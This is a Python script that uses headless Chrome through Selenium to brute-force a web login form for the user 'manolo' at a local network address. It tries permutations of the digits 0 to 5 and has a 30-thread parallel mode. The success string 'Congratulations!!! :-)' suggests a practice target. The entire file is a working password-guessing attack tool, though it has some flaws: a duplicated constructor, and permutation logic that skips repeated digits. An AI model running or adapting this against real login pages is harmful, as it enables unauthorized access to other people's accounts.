import os
import sys

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import itertools, queue, threading

URL = "http://192.168.1.35/"
CHARS = ["0", "1", "2", "3", "4", "5"]
USER = "manolo"
N = 30

def queueTrhead(pb, queue):
    while True:
        password = queue.get()
        pb.login(password)
        queue.task_done()

class PassBroker:
    URL = ""
    USER = ""
    CHARS = ""
    N = 0
    queue = queue.Queue()

    def __init__(self, URL, USER, CHARS):
        self.URL = URL
        self.USER = USER
        self.CHARS = CHARS

    def __init__(self, URL, USER, CHARS, N):
        self.URL = URL
        self.USER = USER
        self.CHARS = CHARS
        self.N = N

    def login(self, tupleOfPasswords):
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        driver = webdriver.Chrome(executable_path="D:\Fragmentos de programas\Scrapping-BruteForce [Python]\chromedriver.exe",chrome_options=chrome_options)
        driver.get(self.URL)
        password = ''.join(tupleOfPasswords)
        driver.find_element(By.NAME, "user").send_keys(self.USER)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.NAME, "login").click()
        html = driver.find_element(By.TAG_NAME, "body").text
        if "Congratulations!!! :-)" in html:
            print("Password found: ",password)
            os._exit(1)
        driver.close()

    def basicBF(self):
        i = 0
        while i < len(self.CHARS):
            result = list(itertools.permutations(self.CHARS, i))
            for element in result:
                self.login(element)
            i += 1
        return result

    def parallelizedBF(self):
        for i in range(self.N):
            th = threading.Thread(target=queueTrhead, args=(self, self.queue))
            th.setDaemon(True)
            th.start()
        for i in range(len(self.CHARS)):
            permutations = list(itertools.permutations(self.CHARS, i))
            for permutation in permutations:
                self.queue.put(permutation)
        self.queue.join()

"""
pb = PassBroker(URL, USER, CHARS)
pb.basicBF()
"""

pb = PassBroker(URL, USER, CHARS, N)
pb.parallelizedBF()
